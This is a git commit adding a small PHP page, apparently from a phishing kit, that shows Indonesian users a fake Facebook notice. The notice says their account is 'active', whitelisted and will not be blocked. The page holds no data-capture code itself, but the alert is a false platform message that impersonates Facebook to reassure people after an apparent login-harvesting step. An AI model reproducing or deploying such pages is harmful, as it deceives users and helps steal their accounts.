2d3ff2701e619680fb2d43c0dbd0026c49a8fca7
Ridwan Irawan <44043446+ridwanirawan@users.noreply.github.com>
2019-03-23 20:28:11 +0700

    Add files via upload

---
+++ V1/aman.php
@@ -0,0 +1,12 @@
+
+<html>
+<head>
+	<title>facebook kamu aman</title>
+</head>
+<body>
+<script>alert('Facebook kamu terdaftar AKTIF dan masuk kedalam WhiteList, terima kasih telah memberitahu kami, Sekarang Facebook Kamu Tidak Akan Kami Blokir');</script>
+<?php
+?>
+thanks
+</body>
+</html>	
